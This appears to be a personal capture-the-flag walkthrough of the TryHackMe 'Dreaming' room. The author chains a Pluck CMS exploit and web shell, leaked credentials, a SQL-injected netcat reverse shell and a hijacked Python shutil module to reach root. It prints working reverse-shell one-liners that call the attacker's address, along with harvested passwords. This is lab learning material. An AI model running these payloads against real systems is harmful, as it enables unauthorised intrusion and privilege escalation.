```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Got in as www-data using this script: https://github.com/Hacker5preme/Exploits/blob/main/CVE-2020-29607-Exploit/exploit.py
The password was `admin:password`

```
p0wny@shell:…/pluck-4.7.13/docs# ls -la
total 72
drwxr-xr-x 2 root root  4096 Jan 29  2020 .
drwxr-xr-x 6 root root  4096 Jan 29  2020 ..
-rw-r--r-- 1 root root  8535 Jan 29  2020 CHANGES
-rw-r--r-- 1 root root 35068 Jan 29  2020 COPYING
-rw-r--r-- 1 root root  1811 Jan 29  2020 README
-rw-r--r-- 1 root root    86 Jan 29  2020 UPDATING
-rw-r--r-- 1 root root  7123 Jan 29  2020 update.php

p0wny@shell:…/pluck-4.7.13/docs# cat update.php
<?php
//First, check if file has been put in the right directory
if (!file_exists('admin.php')) {
	echo 'At the moment, this file is situated in the <i>docs</i> directory. To perform an update, please
	move this file to the root directory of pluck first.';
	exit;
}

//First, define that we are in pluck.
define('IN_PLUCK', true);

//Then start session support.
session_start();

//Include security-enhancements.
require_once ('data/inc/security.php');
//Include functions.
require_once ('data/inc/functions.modules.php');
require_once ('data/inc/functions.all.php');
require_once ('data/inc/functions.admin.php');
//Include Translation data.
require_once ('data/inc/variables.all.php');

//Include header
$titelkop = 'update helper';
include_once ('data/inc/header2.php');

//----------------
//Startpage
//Show the different options for upgrading
//----------------

if (!isset($_GET['step'])) { ?>
	<p>Welcome to the pluck upgrading script. This script will help you upgrade your pluck to the newest version,
	<b><?php echo PLUCK_VERSION; ?></b>. This script only supports upgrading your pluck installation if you use pluck 4.6.x. Updating from any older version is not supported.</p>

	<p><b>We strongly recommend creating a complete backup of your pluck installation before proceeding with the upgrade procedure.</b></p>

	<a href="?step=1"><b>Proceed...</b></a>
<?php }

//----------------
//Step 1
//Convert password to new SHA512 hash
//----------------

if ((isset($_GET['step'])) && ($_GET['step']) == '1') { ?>
	<p>To start the upgrade procedure, please enter the password of your pluck installation below.</p>

	<form action="" method="post">
		<input name="cont1" size="25" type="password" />
		<input type="submit" name="submit" value="Proceed" />
	</form>

<?php
	if (isset($_POST['submit'])) {
		//Include old MD5-hashed password
		require_once ('data/settings/pass.php');
		//If entered password is valid, safe it in new SHA512 hash
		if ($ww == md5($cont1)) {
			save_password($cont1);
			redirect('?step=2', 0);
		}
		//If it's invalid, show error
		else
			show_error('The password you entered is invalid.', 1);
	}
}

//----------------
//Step 2
//Convert pages, blog (posts, comments & categories) and albums
//----------------

if ((isset($_GET['step'])) && ($_GET['step']) == '2') { ?>

	<p>The updater is now converting all the files to the new formats...</p>

	<?php
	//----------------
	//Pages
	//----------------
	if (is_dir('data/settings/pages')) {
		$pages = read_dir_contents('data/settings/pages', 'files');
		if ($pages != FALSE) {
			natcasesort($pages);
			//Move all pages to data/settings (otherwise, page numbers will be messed up
			foreach ($pages as $page) {
				rename('data/settings/pages/'.$page, 'data/settings/'.$page);
			}
			//Save all pages in new format
			foreach ($pages as $page) {
				include_once ('data/settings/'.$page);
				if (save_page($title, $content, $hidden, null))
					unlink('data/settings/'.$page);
				else
					show_error('Could not convert page '.$page.' to the new format.', 1);
			}
		}
	}


	//----------------
	//Blog
	//----------------
	//Check if we need to convert the blog
	if (file_exists('data/settings/modules/blog/post_index.dat')) {
		$handle = fopen('data/settings/modules/blog/post_index.dat', 'r');
		//Make array of posts
		while(!feof($handle)) {
			$file = fgets($handle, 4096);
			//Filter out line breaks
			$file = str_replace ("\n",'', $file);
			//Check if post exists
			if (file_exists('data/settings/modules/blog/posts/'.$file)) {
				$posts[] = $file;
			}
		}
		//Reverse array
		$posts = array_reverse($posts);
		//Move all posts to data/settings/modules/blog
		foreach ($posts as $post) {
			rename('data/settings/modules/blog/posts/'.$post, 'data/settings/modules/blog/'.$post);
		}
		//Include blog functions
		include_once ('data/modules/blog/functions.php');
		//Save all posts in new format
		foreach ($posts as $post) {
			//Get post information
			include_once ('data/settings/modules/blog/'.$post);

			//Get hour and minute from post_time
			list($hour, $minute) = explode(':', $post_time);
			//Save blog post
			$post_seoname = blog_save_post($post_title, $post_category, $post_content, null, mktime($hour, $minute, '00', $post_month, $post_day, $post_year));

			//Check if there are reactions
			if (isset($post_reaction_title)) {
				foreach ($post_reaction_title as $index => $title) {
					//Get hour and minute from post_reaction_time
					list($hour, $minute) = explode(':', $post_reaction_time[$index]);
					blog_save_reaction($post_seoname, $post_reaction_name[$index], 'unknown', 'unknown', $post_reaction_content[$index], null, mktime($hour, $minute, '00', $post_reaction_month[$index], $post_reaction_day[$index], $post_reaction_year[$index]));
				}
			}
			unset($post_reaction_title);

			//Delete post file
			unlink('data/settings/modules/blog/'.$post);
		}
		unset($posts);
		//Delete post index
		unlink('data/settings/modules/blog/post_index.dat');
	}

	//Then check if there are categories to convert
	if (file_exists('data/settings/modules/blog/categories.dat')) {
		//Load them
		$categories = file_get_contents('data/settings/modules/blog/categories.dat');

		//Then in an array
		$categories = explode(',',$categories);

		//Create categories
		foreach ($categories as $category)
			blog_create_category($category);

		//Delete categories file
		unlink('data/settings/modules/blog/categories.dat');
	}

	//----------------
	//Albums
	//----------------
	//Check if there are albums to convert
	if (file_exists('data/settings/modules/albums')) {
		$albums = read_dir_contents('data/settings/modules/albums', 'dirs');
		if ($albums != FALSE) {
			foreach ($albums as $album) {
				//Save album file
				$data['album_name'] = $album;
				save_file('data/settings/modules/albums/'.$album.'.php', $data);

				//Convert images
				$images = read_dir_contents('data/settings/modules/albums/'.$album, 'files');
				if (isset($images)) {
					natcasesort($images);
					$count = 1;
					foreach ($images as $image) {
						//Get image file extension (.jpg or .jpeg)
						if (file_exists('data/settings/modules/albums/'.$album.'/'.str_replace('.php', '', $image).'.jpg'))
							$ext = '.jpg';
						if (file_exists('data/settings/modules/albums/'.$album.'/'.str_replace('.php', '', $image).'.jpeg'))
							$ext = '.jpeg';
						if (strpos($image, '.php')) {
							rename('data/settings/modules/albums/'.$album.'/'.$image, 'data/settings/modules/albums/'.$album.'/'.$count.'.'.str_replace('.php', '', $image).$ext.'.php');
							$count++;
						}
					}
				}
			}
		}
	}

//Done, display message
echo '<p>The updater is now done converting all files to the new formats. If no error messages have shown up above, you can assume the update was successfull. If any errors have appeared above, please tell us about it in a <a href="https://bugs.launchpad.net/pluck-cms" target="_blank">bug report</a>.</p>';

echo '<p><b>Please delete this file (update.php) before proceeding.</b></p>';

echo '<a href="index.php"><b>Go to your website</b></a>';
}

include_once ('data/inc/footer.php');
?>
```

```
p0wny@shell:…/data/settings# cat pass.php
<?php
$ww = 'b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86';
?>

p0wny@shell:…/data/settings# cat token.php
<?php $token = '8eacc00b8fa2ea872b70e4a9ae721b86c60b3f74944e3514f34a83f00c8880ef96ea38b40fe10aefd3a58c20081e52534321f8d3b9254f29aa6393460c2a0eae'; ?>

p0wny@shell:…/data/settings# cat options.php
<?php
$sitetitle = 'dreaming';
$email = 'sandman@dreaming.thm';
?>
```

Gave this to gpt to analyze and I went to recon

```
p0wny@shell:/# cat .badr-info
userId: 66d578e7aafcdc98d344ae23
uploadId: 682a429994b3dd91eb9f3879
roomId: 631211ab243aa600601e75f7
roomCode: dreaming
taskId: 63121214f619d0004ae00ec9
instanceId: 6905ff9fd55e1d8f963e7517
```

On sniffing files, I got a file on /opt which had password for `lucienHeyLucien#@1999!`
and also got this
```
p0wny@shell:/opt# cat getDreams.py
# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"
```

Got in as lucien, and got this on sudo -l and got this and id as this
```
lucien@ip-10-201-82-214:~$ sudo -l
Matching Defaults entries for lucien on ip-10-201-82-214:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on ip-10-201-82-214:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py

lucien@ip-10-201-82-214:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

lucien@ip-10-201-82-214:~$ id
uid=1000(lucien) gid=1000(lucien) groups=1000(lucien),4(adm),24(cdrom),30(dip),46(plugdev)

```

I was going to try exploiting the guid but lol there was bash history on lucien
```
lucien@ip-10-201-82-214:~$ cat .bash_history
ls
cd /etc/ssh/
clear
nano sshd_config
su root
cd ..
ls
cd ..
cd etc
ls
..
cd ..
cd usr
cd lib
cd python3.8
nano shutil.py <== this is definitely something, but I couldn't comprehend
clear
clear
su root
cd ~~
cd ~
clear
ls
mysql -u lucien -plucien42DBPASSWORD <== struck gold maybe
ls -la
cat .bash_history
cat .mysql_history
clear
ls
ls -la
rm .mysql_history
clear
history
exit
clear
ls
clear
cd /opt
ls
clear
nano test.sh
ls -la
su root
ls
mv test.sh test.py
ls -la
history
nano ~/.bash_history
su root
clear
mysql -u lucien -p
clear
history
exit
clear
ls
history
cd ~~
cd ~
cat .bash_history
clear
ls
sudo -l
/usr/bin/python3 /home/death/getDreams.py
sudo -u death /usr/bin/python3 /home/death/getDreams.py
clear
mysql -u lucien -p
mysql -u root -p
su root
lucien@ip-10
```

lol nothing on the db
```
mysql> select * from dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
4 rows in set (0.00 sec)
```
BUT, BUT maybe I can cmd exec this so that I can get rev shell, huh (using chatgpt ofc)

`INSERT INTO dreams (dreamer, dream) VALUES ('Nightmare', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.19.181 4444 >/tmp/f)');`
and got in as death, stabilized the shell~

```
death@ip-10-201-82-214:~^Z
[1]+  Stopped                 nc -lnvp 9001
namura@pop-os ~/tryhackme $ stty raw -echo;fg
nc -lnvp 9001
             id
uid=1001(death) gid=1001(death) groups=1001(death)
death@ip-10-201-82-214:~$ export TERM=xterm

```

And, he also has history, quite helpful

```
death@ip-10-201-82-214:~$ cat .bash_history
su lucien
LS
ls
cd ..
ls
cd lucien
ls
mysql -u death -p
ip a
clear
su lucien
exit
clear
exit
ip a
shutdown -r
shutdown -h now
ip a
shutdown
shutdown -h now
clear
history
exit
ls
cat getDreams.py
mysql -u death -p
clear
mysql -u death -p
mysql -u root -p
mysql -u root
mysql -u root -p
mysql -u death -p
su root
ls
history
nano getDreams.py
python3 getDreams.py
clear
su lucien
clear
cat getDreams.py
ls -la
cd ~
ls
id
export TERM=xterm
ls -la
cat death_flag.txt

death@ip-10-201-82-214:~$ cat .mysql_history
_HiStOrY_V2_
;
FLUSH\040PRIVILEGES;
exit
GRANT\040INSERT\040ON\040library.*\040TO\040'lucien'@'hostname';
exit
show\040databases;
use\040library
GRANT\040INSERT\040ON\040library.*\040TO\040'lucien'@'hostname';
GRANT\040INSERT\040ON\040*.*\040TO\040'lucien'@'localhost'\040WITH\040GRANT\040OPTION;
exit
use\040library;
show\040tables;
select\040*\040from\040dreams;
DELETE\040FROM\040dreams\040WHERE\040dreamer\040=\040'whoami';
select\040*\040from\040dreams;
exit;


```

I don't know why he did `ip -a`
but there was a wget history file 
```
death@ip-10-201-82-214:~$ cat .wget-hsts
# HSTS 1.0 Known Hosts database for GNU Wget.
# Edit at your own risk.
# <hostname>    <port>  <incl. subdomains>      <created>       <max-age>
github.com      0       1       1690589860      31536000

```
And yeah, the getDreams.py was a copy of the file 
Got stuck for a while and read this index file and the shutils.py was there so I asked chatgpt and I can infact get a rev shell huhu
and the file perms matched for death so this must be the one, did this
`echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/10.9.2.12/4444 0>&1'\")" > /usr/lib/python3.8/shutil.py`
I got in as death?

Tried again and again and left the listener open and magically I got in as morpheus? whaty the hek
```
namura@pop-os ~/tryhackme $ nc -lnvp 6969
Listening on 0.0.0.0 6969
Connection received on 10.201.82.214 49970
bash: cannot set terminal process group (2881): Inappropriate ioctl for device
bash: no job control in this shell
morpheus@ip-10-201-82-214:~$ id
id
uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
morpheus@ip-10-201-82-214:~$ sudo -l
sudo -l
Matching Defaults entries for morpheus on ip-10-201-82-214:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User morpheus may run the following commands on ip-10-201-82-214:
    (ALL) NOPASSWD: ALL

```

Don't know how I got it but I am still puzzled
lol there was also a restore.py file on morpheus which I should have read, damn

```
morpheus@ip-10-201-82-214:~$ ls -la
total 44
drwxr-xr-x 3 morpheus morpheus 4096 Aug  7  2023 .
drwxr-xr-x 6 root     root     4096 May 18 20:25 ..
-rw------- 1 morpheus morpheus   58 Aug 14  2023 .bash_history
-rw-r--r-- 1 morpheus morpheus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 morpheus morpheus 3771 Feb 25  2020 .bashrc
-rw-rw-r-- 1 morpheus morpheus   22 Jul 28  2023 kingdom
drwxrwxr-x 3 morpheus morpheus 4096 Jul 28  2023 .local
-rw-rw---- 1 morpheus morpheus   28 Jul 28  2023 morpheus_flag.txt
-rw-r--r-- 1 morpheus morpheus  807 Feb 25  2020 .profile
-rw-rw-r-- 1 morpheus morpheus  180 Aug  7  2023 restore.py
-rw-rw-r-- 1 morpheus morpheus   66 Jul 28  2023 .selected_editor
morpheus@ip-10-201-82-214:~$ cat restore.py
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
morpheus@ip-10-201-82-214:~$ ls -la kingdom
-rw-rw-r-- 1 morpheus morpheus 22 Jul 28  2023 kingdom
morpheus@ip-10-201-82-214:~$ cat kingdom
We saved the kingdom!
morpheus@ip-10-201-82-214:~$ cat /kingdom_backup/kingdom
We saved the kingdom!
```

Anyways good room~